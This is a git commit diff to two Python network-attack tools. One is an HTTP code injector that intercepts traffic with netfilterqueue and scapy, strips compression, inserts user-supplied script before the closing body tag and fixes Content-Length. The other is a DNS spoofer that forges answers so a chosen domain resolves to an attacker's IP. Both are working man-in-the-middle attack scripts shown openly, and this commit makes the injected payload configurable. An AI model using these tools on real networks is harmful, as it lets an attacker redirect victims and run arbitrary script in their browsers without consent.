737f163056fc7c7d88b025dae327443965c3f21c
bipin <bipinbhattarai125@gmail.com>
2024-10-09 18:38:37 +0545

    some changes in dns spoofer and helps the code injector for content length

--- code_injector.py
+++ code_injector.py
@@ -1,6 +1,16 @@
 import netfilterqueue
 import scapy.all as scapy
 import re
+import optparse
+
+def get_argument():
+    parser = optparse.OptionParser()
+    parser.add_option("-c","--code_injector", dest="code_injector", help="enter the injection code ")
+    (options, arguments) = parser.parse_args()
+    if not options.code_injector:
+        parser.error("[-] Enter the the code to be injected with <script> code </script>  --help for more information")
+    else:
+        return options
 def set_load(packet, load):
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
@@ -17,18 +27,20 @@ def process_packet(packet):
                 load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
             elif scapy_packet[scapy.TCP].sport == 80:  # Check for incoming responses
                 print("[+] Response ")
-                injection_code = "<script>alert('test');</script>"
-                load = load.replace ("</body>",injection_code + "</body>")
+
+                load = load.replace ("</body>",options.code_injector + "</body>")
                 #print(scapy_packet.show())
                 content_length_search = re.search("(?:Content-Lenght:\s)(\d*)",load)
                 if content_length_search:
                     content_length = content_length_search.group(1)
-                    new_content_lenght =int(content_length) + len(injection_code)
+                    new_content_lenght =int(content_length) + len(options.code_injector)
                     load = load.replace(content_length,str(new_content_lenght))
             if load != scapy_packet[scapy.Raw].load :
                 new_packet = set_load(scapy_packet,load)
                 packet.set_payload(bytes(new_packet))  # Set the modified packet payload
-    packet.accept()  # Accept the packet
+    packet.accept()
+    # Accept the packet
+options = get_argument()
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
--- dns_spoofer.py
+++ dns_spoofer.py
@@ -2,17 +2,21 @@ import netfilterqueue
 import scapy.all as scapy
 import optparse
 
+
 def get_argument():
     parser = optparse.OptionParser()
-    parser.add_option("-w","--webname", dest="web_name", help="enter the website for spoofing")
-    parser.add_option("-i","--ip", dest="spoof_ip", help="enter the spoof ip address ")
+    parser.add_option("-w", "--webname", dest="web_name", help="Enter the website for spoofing")
+    parser.add_option("-i", "--ip", dest="spoof_ip", help="Enter the spoof IP address")
     (options, arguments) = parser.parse_args()
+
     if not options.web_name:
-        parser.error("[-] Enter the the website  --help for more information")
+        parser.error("[-] Enter the website --help for more information")
     elif not options.spoof_ip:
-        parser.error("[-] Enter the  enter the spoof ip address --help for more information")
-    else:
-        return options
+        parser.error("[-] Enter the spoof IP address --help for more information")
+
+    return options
+
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
 
@@ -20,21 +24,27 @@ def process_packet(packet):
         qname = str(scapy_packet[scapy.DNSQR].qname)
 
         if options.web_name in qname:
-            print("[+] Spoofing the target for:", qname)
+            print(f"[+] Spoofing the target for: {qname}")
             answer = scapy.DNSRR(rrname=qname, rdata=options.spoof_ip)  # Spoofed IP
             scapy_packet[scapy.DNS].an = answer  # Set the answer
             scapy_packet[scapy.DNS].ancount = 1  # Set answer count
 
+            # Delete length and checksum to force recalculation
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
-<<<<<<< HEAD
-        #     #del scapy_packet[scapy.UDP].len
-        #     #del scapy_packet[scapy.UDP].chksum
-        #     print(scapy_packet.show())
->>>>>>> 40b399f34ac2d853b184a2fda6b50b86f25d777c
+
+            # Uncomment these lines if you're also handling UDP packets
+            # del scapy_packet[scapy.UDP].len
+            # del scapy_packet[scapy.UDP].chksum
+
             packet.set_payload(bytes(scapy_packet))  # Set the modified packet payload
+            print("[+] Packet modified and payload set.")
+
     packet.accept()  # Accept the packet
+
+
 options = get_argument()
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
+print("[*] Starting packet capture...")
 queue.run()
